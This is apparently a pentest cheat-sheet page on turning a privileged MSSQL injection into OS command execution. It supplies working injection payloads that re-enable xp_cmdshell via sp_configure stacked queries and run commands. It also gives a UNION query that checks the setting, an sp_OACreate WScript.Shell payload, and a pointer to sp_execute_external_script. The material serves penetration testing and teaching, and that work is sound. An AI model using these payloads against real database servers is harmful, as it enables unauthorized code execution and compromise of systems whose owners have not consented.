---
title: "Command execution through MSSQL injection"
description: "Running OS commands from a privileged SQL Server injection with xp_cmdshell, including the correct sp_configure re-enable sequence, plus OLE automation and external scripts."
keywords:
  - xp_cmdshell
  - sp_configure
  - OLE automation
  - sp_OACreate
  - sp_execute_external_script
---

# Command execution

SQL Server can run OS commands directly through extended procedures, which makes a `sysadmin`-level injection a fast path to code execution as the SQL Server service account.

The primary route is `xp_cmdshell`. It is disabled by default from SQL Server 2005 onward, so it is re-enabled through `sp_configure` (which needs `sysadmin`) and then called. These are separate statements, so the chain needs stacked queries:

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- 
'; EXEC xp_cmdshell 'whoami'-- 
```

Check its current state in `sys.configurations` by name rather than a numeric id:

```sql
' UNION SELECT CAST(value_in_use AS varchar),name,NULL FROM sys.configurations WHERE name='xp_cmdshell'-- 
```

When `xp_cmdshell` is blocked or removed, OLE Automation procedures run a command through a COM object (also `sysadmin`, and the `Ole Automation Procedures` option must be enabled):

```sql
'; DECLARE @o int; EXEC sp_OACreate 'WScript.Shell',@o OUT; EXEC sp_OAMethod @o,'Run',NULL,'cmd /c whoami > C:\windows\temp\o.txt'-- 
```

A third route, where Machine Learning Services is installed, is `sp_execute_external_script` running Python or R, whose process can spawn commands. All of these require `sysadmin` (or a carefully configured proxy), so enumerate the role first; without it, pursue file, credential, or linked-server routes instead. Commands run as the SQL Server service account, so its privileges determine the foothold.

## References

- Microsoft SQL Server Documentation: xp_cmdshell, sp_configure, OLE Automation procedures
- OWASP Testing Guide: Testing for SQL Injection
